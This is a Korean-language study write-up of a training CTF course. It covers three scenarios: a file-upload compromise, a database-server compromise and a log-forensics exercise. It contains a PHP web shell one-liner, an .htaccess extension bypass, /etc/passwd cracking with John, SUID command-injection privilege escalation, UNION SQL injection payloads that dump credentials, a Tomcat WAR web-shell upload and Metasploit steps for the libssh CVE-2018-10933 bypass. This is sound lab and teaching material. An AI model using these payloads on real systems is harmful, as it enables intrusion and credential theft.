# CTF

25-4 CTF 개념 정리 - 시나리오

## 시나리오 1번

모 서버 장악 후, 내부에 저장된 정보를 확인하라.

**힌트**
```
1. 업로드 경로 확인
 - 임의의 파일 업로드 해보기

2. 웹 쉘 업로드 후 소스코드
   <?php system($_GET['cmd']); ?>

   Day2 파일 업로드 취약점 실습 내용
       - 1) 확장자를 우회) php -> phar, phtml 등등
       - 2) .htaccess(아파치 서버 설정 파일) 업로드 후 확장자 저장 설정 변경
             AddType application/x-httpd-php .abc .txt .xyz 등
       - vi .htaccess (.으로 시작되는 파일은 기본적으로 숨김처리 되어있음.
         view - show hidden files 체크 혹은 ls -al

3. 웹 쉘 업로드 성공 후 시스템 명령어로 flag 확인 (cat flag.php X, flag가 들어간 파일)
  - find / -name "flag*"

4.  /etc/passwd 파일
  - john the reaper (패스워드 크랙 툴)로 패스워드 알아내보기 : 크랙 하고자하는 문자열을 vi로 텍스트 파일로 저장.
  - john 파일명
리눅스 : /etc/passwd : 사용자 패스워드 정보를 가지고 있음.

5. setuid가 적용된 파일 찾기 : 인터넷 검색 활용
  - ssh 접속 명령어 : ssh id@ip
  - find / -perm ~
  - /bin/bash : 배시 쉘(터미널 쉘)로 변경

6. SetUID : 리눅스 특수 권한 파일을 실행 시에만 root 권한 획득
  - cat으로 실행시키지 말고, 해당 경로에서 ./프로그램 명으로 실행해보기
  - 커맨드 인젝션 - 권한 상승(LPE) - root 권한 획득 시, flag 값을 확인 가능
  - 명령어 이어서 쓸 때 ; 을 이용했던 것을 기억  ex) ls ; pwd
  - 특수 권한 SetUID: 파일을 실행할 때에만 파일 소유자 권한(root)을 획득할 수 있는 특수권한

7. root 계정으로 실행했던 명령어 로그 : bash history 확인

```

**kali linux 프록시 설정 끄는 법**

1. Web Browser
2. 우측 상단 햄버거 기호 클릭
3. Preferences
4. Proxy 검색
5. settings No Proxy로 바꾼 후 접속

**시나리오 흐름도**

1. 파일 업로드 기능 확인
2. 확장자 우회
3. 서버 장악
4. 계정 탈취
5. 공격 벡터 확인
6. 권한 상승
7. 정보 수집

***

### 1) 업로드가 가능한 경로

파일 업로드 시 유의미한 경로 발견
```
/uploads/~
```

***

### 2) 특정파일의 확장자 확인

.php .phtml .phar 확장자는 모두 차단되었음.

```sh
AddType application/x-httpd-php .abc .txt .xyz
```
상대 서버 /var/www/html 경로 내에 .htaccess 파일 전송 후

위 3개의 확장자 중 하나로 php 코드 전송

***

### 3) 웹 쉘 업로드 및 파일 확인

웹 쉘이 사용가능하고, find 명령어를 통해 파일의 위치를 확인.
```sh
find / -name flag*
```

***

### 4) 서버 특정 사용자 패스워드 획득

```sh
cat /etc/passwd
```
ems 계정의 해시 함수로 암호화된 비밀번호 획득

rockyou.txt.gz 파일 압축 해제
```sh
gzip -d rockyou.txt.gz
```
test.txt 파일에 복사한 후, 
```sh
john test.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
입력하여 
```sh
john --show test.txt
```
크래킹하여 패스워드 평문 확인

***

### 5) 서버 내 setuid 적용된 파일 확인

```sh
ssh ems@ip주소
```

SSH 접속 후, dumb shell을 bash shell로 전환

```sh
/bin/bash
```

쓸모없는 파일 제외하고 보기 기능
```sh
2>/dev/null
```

find 명령어로 setuid 적용된 파일 확인
```sh
find / -perm 4000 2>/dev/null
```

***

### 6) root 권한 획득

```sh
./Sub_pro
```

파일 실행시 Command Injection 공격 수행

```
1;bash
```

root 계정으로 bash shell 획득.

***
### 7) root 계정으로 실행했던 bash history 확인

root 디렉토리 하위의 .bash_history 파일 확인

```sh
cat /root/.bash_history
```

***

## 시나리오 2번

모 DB 서버 장악 후 유의미한 정보 확인

**힌트**
```
1. SQL Injection 취약점 찾기 or 1 = 1 ; # 등의 구문으로 취약점 찾기

2. ') UNION ~ ; # 구문 이용 SQL Injection (Day2 웹 UNION SQL Injection 문제와 구문은 동일)

3. 추가적으로 UNION SQL Injection 수행하여 정보 얻어내기

4. pw 해시값
  - 칼리 터미널 john the reaper(패스워드 크랙 툴) 사용 / john 파일명
  - 해시값 인터넷 검색도 가능

5. kali 내 jsp 웹쉘 스크립트 경로: /usr/share/webshell/jsp 내 cmdjsp.jsp 파일 사용 // WAR 압축파일로 만들어서 업로드
(Day2 17번 Tomcat Admin 실습 내용과 동일)
웹쉘의 동작 조건 2가지
- 1. 웹쉘 업로드 / 파일 업로드 취약점
- 2. 웹쉘에 접근 가능

6. key : conn   find / -name abcdef

7. nmap 활용 (칼리 터미널에서) libssh

8. 메타스플로잇 활용 (search libssh, show options, set 옵션, run)
- set rhost : ip 주소
- set rport : 포트번호
- set spawn_pty true : 가상의 터미널 여는 옵션
- 세션이 열리면 sessions -i : 열려있는 세션 확인, sessions -i 세션 넘버 // 쉘 열림
```

**시나리오 흐름도**

1. 취약점 확인
2. DB 정보 확인
3. 데이터 탈취
4. 관리자 계정 탈취
5. 서버 장악
6. 정보 탈취
7. 취약점 확인
8. 서버 장악

***

### 1) 취약점 확인

회원 가입 후, 메모 조회 기능에 임의 문자열('#) 입력 후 반응 보기 -> SQL Injection 취약점
```
') or 1 = 1 ; #
```
타 사용자의 메모를 조회할 수 있음.

***

### 2) DB 정보 확인

DB 정보를 찾기 위해 먼저
```sql
') UNION SELECT 1, 2, table_name, 4 FROM information_schema.tables WHERE table_type='base table' ; #
```
입력하여 'f14g'라는 테이블 이름 알아내기

***

### 3) 데이터 탈취

'f14g' 테이블의 컬럼명 알아내기
```sql
') UNION SELECT 1, 2, column_name, 4 FROM information_schema.columns WHERE table_name='f14g' ; #
```
입력하여 'flag'라는 컬럼명을 알아내고, 조회된 컬럼명을 토대로 컬럼값을 조회해본다.
```sql
') UNION SELECT 1, 2, flag, 4 FROM f14g ; #
```

***

### 4) 관리자 계정 탈취

member라는 테이블에 계정 정보가 들어있다는 정보를 알고 있을 때,
```sql
') UNION SELECT 1, 2, column_name, 4 FROM information_schema.columns WHERE table_name='member' ; #
```
no, id, pw라는 컬럼을 가지고 있는 table임을 알 수 있음.

```sql
') UNION SELECT 1, 2, id, pw FROM member ; #
```
관리자의 id와 pw를 알 수 있음.

pw는 해시 함수로 암호화 되어있기 때문에, john the reaper 방식을 이용해서 패스워드 크래킹을 진행하거나, 인터넷에 나와있는 툴로 진행한다.

***

### 5) 서버 장악

ip주소:포트/manage/html 주소로 들어왔을 때, 얻어낸 관리자 계정으로 로그인 가능.

로그인 후, 관리자 페이지 내에서 Deploy 기능을 확인한다.

웹 쉘 업로드를 위해 kali에 내장되어 있는 /usr/share/webshell/jsp/cmdjsp.jsp 파일을 사용한다.
```sh
jar cvf webshell.war cmdjsp.jsp
```
WAR 파일로 변환시켜준 후, 업로드한다.

웹 쉘을 통해 서버 내 저장된 파일들의 정보를 확인한다.

***

### 6) 정보 탈취

/tomcat7/webapps/ROOT/index.jsp

경로에 있는 DB 접속 파일을 확인한다.

```
얻을 수 있는 정보
1) DB IP 주소
2) DB 사용자의 ID
3) DB 사용자의 PW
```

***

### 7) 취약점 확인

```sh
nmap -sV IP주소
```
```sh
2222/tcp open  ssh  libssh 0.8.1
```
명령어를 통해 DB서버에 포트 스캔을 진행하고, SSH와 DB 포트가 오픈되어 있음을 알 수 있다.

SSH 연결을 시도하여, 어플리케이션 이름과 버전을 확인한다.

***

### 8) 서버 장악

**힌트**
CVE-2018-10933은 libssh 라이브러리의 치명적인 인증 우회 취약점.

공격자는 비밀번호나 키 없이도 SSH 인증을 우회하여 루트 쉘을 획득할 수 있다.

libssh는 내부적으로 SSH2_MSG_USERAUTH_SUCCESS 메시지를 클라이언트 → 서버 방향으로 처리해버림.

즉, 공격자가 서버에게 "나 인증됐음!" 이라고 말하면 서버가 그걸 믿어버림.

```sh
msfconsole
```
메타스플로잇 실행시켜서 콘솔 열어주기

```sh
search libssh
```
libssh 찾고

```sh
use 0
```
0번 리스트에 있다.

```sh
set RHOST ip주소
```
ip 주소를 설정하고,

```sh
set RPORT 포트번호
```
포트 번호를 설정하고,

```sh
set SPAWN_PTY true
```
익스플로잇이 성공했을 때 가상 터미널(PTY) 을 생성해준다.

```sh
exploit
```
프로그램 시작

```sh
sessions -i 1
```
익스플로잇을 성공하고 세션에 연결

```sh
id
```
입력 시, root임을 확인.

결과적으로, CVE-2018-10933을 이용하여 공격자 서버를 장악 성공

***

## 시나리오 3번

모 서버의 로그를 분석해서 공격자의 행위를 파악하고, 사용중인 서비스의 취약점을 파악하여 조치하라.

**힌트**
```
1. find, mtime

2. ls -al

3. access.log

4. DB 설정 파일

5. general_log

6. sql 질의

7. xferlog

8. xferlog 분석
```

**시나리오 흐름도**

1. 공격 로그 확인
2. 생성 시간 확인
3. 공격자 주소 확인
4. 추가 공격 행위 분석
5. 추가 공격 행위 분석
6. 유출 자료 확인
7. 추가 공격 확인
8. 최초 공격 시간 확인

***

### 1) 공격 로그 확인

마지막 변경된 시간이 5년 전이므로, mtime 시간은 2000일 정도로 넉넉하게 주자.
```sh
find /var/www -mtime -2000
```

***

### 2) 생성 시간 확인

```sh
ls -al 찾은 파일
```
상세한 정보를 얻을 수 있다.

***

### 3) 공격자 주소 확인

```sh
cat /var/log/apache2/access.log.1 | grep 파일명의 일부분
```

access.log를 열람해서 웹 쉘에 접근한 기록을 확인할 수 있다.

***

### 4) 추가 공격 행위 분석

access.log에서 웹 쉘을 통해 실행된 명령을 확인한다.

***

### 5) 추가 공격 행위 분석

mriadb의 general_log의 위치를 파악

웹 쉘이 업로드 된 시간 이후의 DB 트랜잭션 로그(/var/lib/mysql/로그파일)를 분석

***

### 6) 유출 자료 확인

```sql
select f14g from flag;
```

general_log를 통해 파악한 탈취된 테이블에 대하여 질의

***

### 7) 추가 공격 확인

```sh
sudo cat vsftpd.log.2 | grep anon
```

xferlog를 분석하여 웹 쉘을 업로드한 FTP 계정을 확인

***

### 8) 최초 공격 시간 확인

마찬가지로, xferlog를 분석하여 공격자가 서버에 최초 접근한 시간을 확인한다.

***
